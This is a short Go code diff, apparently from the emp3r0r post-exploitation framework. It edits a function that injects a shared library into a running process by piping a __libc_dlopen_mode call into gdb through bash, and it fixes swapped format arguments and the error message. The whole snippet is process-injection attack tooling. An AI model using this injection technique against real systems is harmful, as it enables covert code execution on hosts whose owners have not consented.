@@ -47,13 +47,13 @@ func gdbInjectSO(path_to_so string, pid int) error {
 		pid = cmd.Process.Pid
 	}
 
-	out, err := exec.Command(emp3r0r_data.UtilsPath+"/bash", "-c",
-		fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
-			gdb_path,
-			path_to_so,
-			pid)).CombinedOutput()
+	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
+		path_to_so,
+		gdb_path,
+		pid)
+	out, err := exec.Command(emp3r0r_data.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
 	if err != nil {
-		return fmt.Errorf("GDB failed: %s\n%v", out, err)
+		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
 	}
 
 	return nil
